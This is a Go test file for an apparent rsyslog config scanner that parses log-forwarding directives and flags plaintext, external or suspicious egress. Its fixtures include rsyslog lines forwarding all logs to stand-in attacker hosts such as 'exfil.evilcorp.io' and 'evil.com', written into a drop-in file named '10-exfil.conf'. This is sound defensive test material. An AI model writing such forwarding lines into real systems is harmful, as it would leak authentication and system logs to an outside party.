package rsyslog

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

func TestPinnedDirectiveKindStrings(t *testing.T) {
	pairs := []struct{ got, want string }{
		{string(KindLegacyUDP), "legacy-udp"},
		{string(KindLegacyTCP), "legacy-tcp"},
		{string(KindActionOmfwd), "action-omfwd"},
		{string(KindActionOmhttp), "action-omhttp"},
		{string(KindUnknown), "unknown"},
	}
	for _, p := range pairs {
		if p.got != p.want {
			t.Fatalf("directive_kind drift: got %q want %q", p.got, p.want)
		}
	}
}

func TestHashContentsDeterministic(t *testing.T) {
	a := HashContents([]byte("*.* @host:514\n"))
	b := HashContents([]byte("*.* @host:514\n"))
	if a != b || len(a) != 64 {
		t.Fatalf("a=%q b=%q", a, b)
	}
}

func TestIsRFC1918AddressIPv4(t *testing.T) {
	hit := []string{"10.0.0.5", "172.16.0.1", "192.168.1.1", "127.0.0.1", "169.254.1.1"}
	for _, a := range hit {
		if !IsRFC1918Address(a) {
			t.Fatalf("%q must flag private", a)
		}
	}
	miss := []string{"8.8.8.8", "1.1.1.1", "169.255.0.1", "not-an-ip"}
	for _, a := range miss {
		if IsRFC1918Address(a) {
			t.Fatalf("%q must NOT flag private", a)
		}
	}
}

func TestIsExternalDestination(t *testing.T) {
	external := []string{
		"8.8.8.8",
		"collect.evilcorp.io",
		"https://collect.evilcorp.io/api/v1/logs",
		"logs.example.com:6514",
	}
	for _, h := range external {
		if !IsExternalDestination(h) {
			t.Fatalf("%q must flag external", h)
		}
	}
	internal := []string{
		"127.0.0.1",
		"localhost",
		"10.0.0.5",
		"192.168.1.100:514",
		"",
	}
	for _, h := range internal {
		if IsExternalDestination(h) {
			t.Fatalf("%q must NOT flag external", h)
		}
	}
}

// -- AnnotateSecurity end-to-end -------------------------------------

func TestAnnotateLegacyUDPInternalLooksClean(t *testing.T) {
	f := Forwarder{
		DirectiveKind: KindLegacyUDP,
		Selector:      "auth.*",
		Destination:   "10.0.0.5",
	}
	AnnotateSecurity(&f)
	if !f.IsPlaintextTransport {
		t.Fatal("legacy UDP must flag plaintext")
	}
	if f.IsDestinationExternal {
		t.Fatal("RFC1918 must NOT flag external")
	}
	if f.IsSuspiciousEgress {
		t.Fatal("internal plaintext = noisy but NOT suspicious")
	}
}

func TestAnnotateLegacyTCPExternalIsSuspicious(t *testing.T) {
	f := Forwarder{
		DirectiveKind: KindLegacyTCP,
		Selector:      "*.*",
		Destination:   "exfil.evilcorp.io",
	}
	AnnotateSecurity(&f)
	if !f.IsPlaintextTransport {
		t.Fatal("legacy TCP must flag plaintext")
	}
	if !f.IsDestinationExternal {
		t.Fatal("public hostname must flag external")
	}
	if !f.SelectorIncludesEverything {
		t.Fatal("*.* must flag wildcard selector")
	}
	if !f.IsSuspiciousEgress {
		t.Fatal("plaintext + external = suspicious")
	}
}

func TestAnnotateOmfwdWithTLSClean(t *testing.T) {
	f := Forwarder{
		DirectiveKind:     KindActionOmfwd,
		Destination:       "logs.corp.example.com",
		DestinationPort:   6514,
		TransportProtocol: "tcp",
		TLSDriver:         "gtls",
	}
	AnnotateSecurity(&f)
	if !f.IsTLSEnabled {
		t.Fatal("StreamDriver=gtls must flag TLS")
	}
	if f.IsPlaintextTransport {
		t.Fatal("TLS-tunnelled omfwd must NOT flag plaintext")
	}
	// Public hostname → external, but with TLS we don't flag suspicious.
	if f.IsSuspiciousEgress {
		t.Fatal("TLS to external = OK")
	}
}

func TestAnnotateOmhttpFlagsHTTPEgress(t *testing.T) {
	f := Forwarder{
		DirectiveKind: KindActionOmhttp,
		Destination:   "https://collect.example.com/api/logs",
	}
	AnnotateSecurity(&f)
	if !f.IsHTTPEgress {
		t.Fatal("omhttp must flag")
	}
	if !f.IsTLSEnabled {
		t.Fatal("https:// must flag TLS")
	}
	if !f.IsDestinationExternal {
		t.Fatal("public URL must flag external")
	}
	// HTTPS + external = suspicious because omhttp itself is uncommon.
	if !f.IsSuspiciousEgress {
		t.Fatal("omhttp external must flag suspicious")
	}
}

// -- Parse end-to-end ----------------------------------------------

func TestParseLegacyUDPAndTCP(t *testing.T) {
	body := []byte(`# /etc/rsyslog.conf
$WorkDirectory /var/spool/rsyslog

*.*  @logs.corp.example.com:514
auth.*  @@logs.corp.example.com:6514
`)
	got := Parse(body, "/etc/rsyslog.conf")
	if len(got) != 2 {
		t.Fatalf("rows=%d, want 2: %+v", len(got), got)
	}
	if got[0].DirectiveKind != KindLegacyUDP || got[0].DestinationPort != 514 {
		t.Fatalf("UDP row: %+v", got[0])
	}
	if got[1].DirectiveKind != KindLegacyTCP || got[1].DestinationPort != 6514 {
		t.Fatalf("TCP row: %+v", got[1])
	}
	if got[0].Selector != "*.*" || got[1].Selector != "auth.*" {
		t.Fatalf("selectors: %+v", got)
	}
}

func TestParseActionOmfwdMultiline(t *testing.T) {
	body := []byte(`action(
    type="omfwd"
    target="logs.internal"
    port="6514"
    protocol="tcp"
    StreamDriver="gtls"
)
`)
	got := Parse(body, "x.conf")
	if len(got) != 1 {
		t.Fatalf("rows=%d", len(got))
	}
	f := got[0]
	if f.DirectiveKind != KindActionOmfwd {
		t.Fatalf("kind=%q", f.DirectiveKind)
	}
	if f.Destination != "logs.internal" || f.DestinationPort != 6514 {
		t.Fatalf("dest: %+v", f)
	}
	if f.TLSDriver != "gtls" {
		t.Fatalf("tls=%q", f.TLSDriver)
	}
	if !f.IsTLSEnabled {
		t.Fatal("gtls must flag TLS")
	}
}

func TestParseActionOmhttp(t *testing.T) {
	body := []byte(`action(type="omhttp" server="https://collect.example.com/api/logs")`)
	got := Parse(body, "x.conf")
	if len(got) != 1 {
		t.Fatalf("rows=%d", len(got))
	}
	if got[0].DirectiveKind != KindActionOmhttp {
		t.Fatalf("kind=%q", got[0].DirectiveKind)
	}
	if got[0].Destination != "https://collect.example.com/api/logs" {
		t.Fatalf("dest=%q", got[0].Destination)
	}
}

func TestParseSkipsCommentsAndModules(t *testing.T) {
	body := []byte(`# comment
$ModLoad imuxsock
module(load="omrelp")
`)
	got := Parse(body, "x.conf")
	if len(got) != 0 {
		t.Fatalf("module loads must NOT yield forwarders: %+v", got)
	}
}

func TestParseHonoursMaxRows(t *testing.T) {
	var body []byte
	for i := 0; i < MaxRows+10; i++ {
		body = append(body, []byte("*.* @host.example.com:514\n")...)
	}
	got := Parse(body, "x")
	if len(got) > MaxRows {
		t.Fatalf("rows=%d > MaxRows=%d", len(got), MaxRows)
	}
}

// -- collector end-to-end -------------------------------------------

func TestFileCollectorWalksSeedsAndDropIns(t *testing.T) {
	tmp := t.TempDir()
	main := filepath.Join(tmp, "rsyslog.conf")
	dropIn := filepath.Join(tmp, "rsyslog.d")
	must(t, os.MkdirAll(dropIn, 0o755))
	must(t, os.WriteFile(main, []byte(`*.* @internal.example.com:514`+"\n"), 0o644))
	must(t, os.WriteFile(filepath.Join(dropIn, "10-exfil.conf"),
		[]byte(`*.* @@exfil.evilcorp.io:514`+"\n"), 0o644))
	must(t, os.WriteFile(filepath.Join(dropIn, "ignored.bak"),
		[]byte(`*.* @evil.com:1`+"\n"), 0o644))

	c := &fileCollector{
		seeds:      []string{main},
		dropInDirs: []string{dropIn},
		readFile:   os.ReadFile,
		readDir:    os.ReadDir,
	}
	got, err := c.Collect(context.Background())
	if err != nil {
		t.Fatalf("Collect: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("want 2 (skip .bak), got %d: %+v", len(got), got)
	}
}

func TestFileCollectorMissingPathsOK(t *testing.T) {
	c := &fileCollector{
		seeds:      []string{"/nope"},
		dropInDirs: []string{"/nope-d"},
		readFile:   os.ReadFile,
		readDir:    os.ReadDir,
	}
	got, err := c.Collect(context.Background())
	if err != nil {
		t.Fatalf("missing must not error: %v", err)
	}
	if len(got) != 0 {
		t.Fatalf("want empty, got %d", len(got))
	}
}

// -- SortForwarders ------------------------------------------------

func TestSortForwardersDeterministic(t *testing.T) {
	in := []Forwarder{
		{FilePath: "/etc/rsyslog.d/z.conf", LineNo: 1},
		{FilePath: "/etc/rsyslog.conf", LineNo: 5},
		{FilePath: "/etc/rsyslog.conf", LineNo: 2},
	}
	SortForwarders(in)
	if in[0].FilePath != "/etc/rsyslog.conf" || in[0].LineNo != 2 {
		t.Fatalf("first=%+v", in[0])
	}
}

// -- helpers --------------------------------------------------------

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}
